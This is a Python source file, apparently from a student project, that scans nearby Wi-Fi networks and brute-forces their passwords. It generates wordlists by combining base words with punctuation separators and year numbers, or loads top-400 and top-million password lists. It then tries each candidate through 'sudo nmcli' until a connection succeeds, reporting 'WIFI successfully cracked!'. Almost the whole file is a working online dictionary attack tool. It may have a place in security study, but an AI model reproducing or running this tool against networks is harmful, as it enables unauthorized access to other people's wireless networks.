import datetime
import itertools
import shlex
import subprocess
import time

import pywifi

from backend.utils.file_helper import create_or_get_dir_location


def get_all_discovered_networks():
    available_devices = []
    wifi = pywifi.PyWiFi()
    interface = wifi.interfaces()[0]
    interface.scan()
    time.sleep(5)
    x = interface.scan_results()
    while len(x) == 0:
        interface.scan()
        time.sleep(5)
        x = interface.scan_results()
    for i in x:
        available_devices.append(i.ssid)
    return available_devices

def extract_base_word_list(filename):
    wordlist = []
    with open(filename,'r') as f:
        for i in f:
            i = i.replace('\n','')
            i = i.strip()
            wordlist.append(i)
    return wordlist

def duplicate_separators(sep_list):
    duplicate_list = []
    for sep in sep_list:
        duplicate_list.append((sep, sep))
    return duplicate_list

def generate_list(wordList,wifi_name):
    path = create_or_get_dir_location("WIFI_CRACKING_LISTS", wifi_name)
    separators = " !#$%&'()*+,-./:;<=>?@[\]^_`{|}~"
    separators_2 = " !#$%&'()*+,-./:;<=>?@[\]^_`{|}~"
    separators_list = [char for char in separators]
    numbers = [item for item in range(0, datetime.date.today().year + 1)]
    upper_list = [x.upper() for x in wordList]

    permutation_of_2 = get_combinations_of_words(wordList, 2)
    permutation_of_2_separators = get_combinations_of_words(separators_2, 2)
    permutation_of_2_separators.extend(duplicate_separators(separators))
    final_list = []
    final_list.extend(wordList)
    final_list.extend(upper_list)

    with open(path+'/'+'generated_list.txt', "a") as fp:
        fp.write('\n'.join(final_list))

    permutation_of_1_list = []
    for comb in final_list:
        for number in numbers:
            permutation_of_1_list.append(comb + str(number))
            for char in separators_list:
                permutation_of_1_list.append(comb+char+str(number))

    with open(path+'/'+'generated_list.txt', "a") as fp:
        fp.write('\n'.join(permutation_of_1_list))
    del permutation_of_1_list
    del final_list
    for separators_combo in permutation_of_2_separators:
        for words_combo in permutation_of_2:
            new_word = words_combo[0] + separators_combo[0] + words_combo[1] + separators_combo[1]
            with open(path+'/'+'generated_list.txt', "a") as fp:
                fp.write("%s\n" % new_word)

            for number in numbers:
                new_word = words_combo[0]+separators_combo[0]+words_combo[1]+separators_combo[1]+str(number)
                with open(path+'/'+'generated_list.txt', "a") as fp:
                    fp.write("%s\n" % new_word)

    return path+'/'+'generated_list.txt'

def get_combinations_of_words(wordList, rank):
    return list(itertools.permutations(wordList, rank))

def try_and_break(arguments):
    arguments_array = arguments.split('~')
    wifi_name = arguments_array[0]
    option = arguments_array[2]
    filename = arguments_array[3]
    wordlist = []
    file_path = ''
    if option =='fast':
        wordlist = extract_base_word_list('/home/stefanita/PycharmProjects/Licenta2/backend/wifi_cracking/top400.txt')
    elif option =='intensive':
        wordlist =extract_base_word_list('/home/stefanita/PycharmProjects/Licenta2/backend/wifi_cracking/top1Mil.txt')
    elif option == 'custom':
        file_path =generate_list(extract_base_word_list(filename), wifi_name)

    result = crack_wifi(wifi_name, wordlist, file_path)

    return result

def connect(wifi_name, word):
    process = subprocess.Popen(shlex.split(f"sudo nmcli dev wifi connect \"{wifi_name}\" password \"{word}\""),
                               stdout=subprocess.PIPE,
                               universal_newlines=True)

    while True:
        return_code = process.poll()
        if return_code is not None:
            return  process.stdout.readlines()


def crack_wifi(wifi_name, wordlist, path):
    result = {
        'wifi_name': wifi_name,
        'password': '',
        'time_elapsed': 0,
        'number_of_tries': '',
        'output': ''
    }
    found = False
    index = 0
    start_time = time.time()
    if path != '' and wordlist == []:
        with open(path, "r") as fp:
            for line in fp:
                index += 1
                value = line.strip()
                output = connect(wifi_name, value)
                time.sleep(5)
                if len(output) != 0 and len(output) >= 2:
                    if output[1].find('successfully activated with') != -1:
                        found = True
                        finish_time = time.time()
                        timer = finish_time - start_time
                        result['password'] = value
                        result['time_elapsed'] = timer
                        result['number_of_tries'] = f"{index} tries"
                        result['output'] = 'WIFI successfully cracked!'
                        break

    else:
        for word in wordlist:
            index += 1
            output = connect(wifi_name, word)
            time.sleep(5)
            if len(output) != 0 and len(output) >= 2:
                if output[1].find('successfully activated with') != -1:
                    found = True
                    finish_time = time.time()
                    timer = finish_time - start_time
                    result['password'] = word
                    result['time_elapsed'] = timer
                    result['number_of_tries'] = f"{index} tries out of {len(wordlist)} possible options"
                    result['output'] = 'WIFI successfully cracked!'
                    break
    if found:
        return result
    else:
        finish_time = time.time()
        timer = finish_time - start_time
        result['password'] = 'N\A'
        result['time_elapsed'] = timer
        result['number_of_tries'] = f"tried all {len(wordlist)} options"
        result['output'] = 'WIFI could not be cracked!'
        return result
